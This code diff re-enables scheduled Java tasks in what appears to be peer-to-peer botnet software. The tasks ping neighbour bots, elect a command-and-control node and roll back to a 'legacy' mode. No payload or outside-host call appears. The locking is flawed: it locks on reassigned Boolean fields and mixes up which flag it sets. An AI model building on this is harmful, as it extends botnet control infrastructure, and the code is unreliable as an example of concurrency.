@@ -36,76 +36,76 @@ public class ScheduledTasksNet {
 	private Boolean flagNeighbours = false;
 	private Boolean flagLegacy = false;
 
-//	@Scheduled(initialDelay = 100000, fixedRate = 60000)
-//	public void pingNeighbours() {
-//		synchronized (flagLegacy) {
-//			if (flagLegacy == false)
-//				synchronized (flagELection) {
-//					if (flagELection == false) {
-//						synchronized (flagNeighbours) {
-//							flagNeighbours = true;
-//						}
-//						botB.pingToNeighbours();
-//						synchronized (flagNeighbours) {
-//							flagNeighbours = false;
-//						}
-//
-//					}
-//				}
-//		}
-//	}
-//
-//	@Scheduled(initialDelay = 240000, fixedRate = 120000)
-//	public void electionDay() {
-//		synchronized (flagLegacy) {
-//			if (flagLegacy == false)
-//				synchronized (flagNeighbours) {
-//					if (flagNeighbours == false)
-//						if (configEngine.isCommandandconquerStatus()) {
-//							synchronized (flagELection) {
-//								flagNeighbours = true;
-//							}
-//							cmm.startElection();
-//							synchronized (flagELection) {
-//								flagNeighbours = false;
-//							}
-//						}
-//				}
-//		}
-//	}
-//
-//	@Scheduled(initialDelay = 180000, fixedRate = 60000)
-//	public void rollBack() {
-//		synchronized (flagELection) {
-//			synchronized (flagNeighbours) {
-//				if (flagELection == false) {
-//					if (flagNeighbours == false) {
-//						if (!configEngine.isCommandandconquerStatus()) {
-//							if (nServ.getCounterCeCMemory() == 1) {
-//								synchronized (flagLegacy) {
-//									flagLegacy = true;
-//								}
-//								cmm.legacy();
-//								if(getLegacy()){
-//									setLegacy(false);
-//								}
-//							}
-//						}
-//					}
-//				}
-//			}
-//		}
-//
-//	}
-//
-//	public Boolean setLegacy(Boolean newLegacy){
-//		synchronized (flagLegacy) {
-//			flagLegacy=newLegacy;
-//			return true;
-//		}
-//		
-//		
-//	}
+	@Scheduled(initialDelay = 600000, fixedRate = 1800000)
+	public void pingNeighbours() {
+		synchronized (flagLegacy) {
+			if (flagLegacy == false)
+				synchronized (flagELection) {
+					if (flagELection == false) {
+						synchronized (flagNeighbours) {
+							flagNeighbours = true;
+						}
+						botB.pingToNeighbours();
+						synchronized (flagNeighbours) {
+							flagNeighbours = false;
+						}
+
+					}
+				}
+		}
+	}
+
+	@Scheduled(initialDelay = 3600000, fixedRate = 3600000)
+	public void electionDay() {
+		synchronized (flagLegacy) {
+			if (flagLegacy == false)
+				synchronized (flagNeighbours) {
+					if (flagNeighbours == false)
+						if (configEngine.isCommandandconquerStatus()) {
+							synchronized (flagELection) {
+								flagNeighbours = true;
+							}
+							cmm.startElection();
+							synchronized (flagELection) {
+								flagNeighbours = false;
+							}
+						}
+				}
+		}
+	}
+
+	@Scheduled(initialDelay = 1200000, fixedRate = 1800000)
+	public void rollBack() {
+		synchronized (flagELection) {
+			synchronized (flagNeighbours) {
+				if (flagELection == false) {
+					if (flagNeighbours == false) {
+						if (!configEngine.isCommandandconquerStatus()) {
+							if (nServ.getCounterCeCMemory() == 1) {
+								synchronized (flagLegacy) {
+									flagLegacy = true;
+								}
+								cmm.legacy();
+								if(getLegacy()){
+									setLegacy(false);
+								}
+							}
+						}
+					}
+				}
+			}
+		}
+
+	}
+
+	public Boolean setLegacy(Boolean newLegacy){
+		synchronized (flagLegacy) {
+			flagLegacy=newLegacy;
+			return true;
+		}
+		
+		
+	}
 
 	
 	
